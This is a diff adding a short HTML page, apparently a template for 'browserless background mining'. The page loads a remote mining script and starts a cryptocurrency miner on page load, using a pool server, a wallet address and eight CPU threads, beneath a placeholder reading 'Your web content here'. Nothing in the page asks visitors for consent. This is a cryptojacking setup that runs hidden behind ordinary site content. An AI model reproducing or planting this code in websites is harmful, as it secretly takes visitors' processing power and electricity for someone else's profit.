@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kshitizzz</title>
+</head>
+<body>
+<h1>Demo Browserless Background Mining</h1>
+<h1>Your web content here</h1>
+<script src="https://webminer.pages.dev/dist/mm.js"></script>
+<script>
+  const client = new Client({
+    algorithm: 'yespower',                           // yespower, minotaurx
+    stratum: {
+      server: "yespower.na.mine.zpool.ca",
+    "port": 6234,                                     // Your Pool port
+      worker: "1K9GvNaThFHYd8AcRbGAYvt5gKSZBEQbcq",   // Your Wallet
+      password: "c=BTC"                               // Your Mining password
+    },
+    options: {
+      threads: 8,                                     // CPU threads to mining
+      log: true                                       // Show log on console
+    },
+  });
+
+  // Start Mining
+  client.start();
+</script>
+</body>
+</html>
